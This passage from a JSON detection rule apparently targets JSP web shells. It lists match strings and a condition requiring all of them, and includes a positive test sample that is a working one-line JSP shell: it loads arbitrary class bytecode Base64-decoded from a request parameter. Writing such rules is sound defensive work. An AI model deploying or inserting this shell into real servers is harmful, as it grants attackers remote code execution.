    },
    {
     "name": "c",
     "type": "ascii",
     "value": "ClassLoader"
    },
    {
     "name": "r",
     "type": "regex",
     "value": "request\\s*\\.\\s*get(?:Parameter|Reader|InputStream)"
    },
    {
     "name": "b",
     "type": "ascii",
     "value": "Base64",
     "nocase": true
    },
    {
     "name": "t",
     "type": "ascii",
     "value": "<%"
    }
   ],
   "condition": {
    "all": [
     {
      "str": "d"
     },
     {
      "str": "c"
     },
     {
      "str": "r"
     },
     {
      "str": "b"
     },
     {
      "str": "t"
     }
    ]
   },
   "samples": {
    "positive": [
     {
      "text": "<%! class U extends ClassLoader { U(ClassLoader c){super(c);} Class g(byte[] b){return defineClass(b,0,b.length);} } %><% new U(this.getClass().getClassLoader()).g(Base64.decode(request.getParameter(\"p\"))); %>"
     }
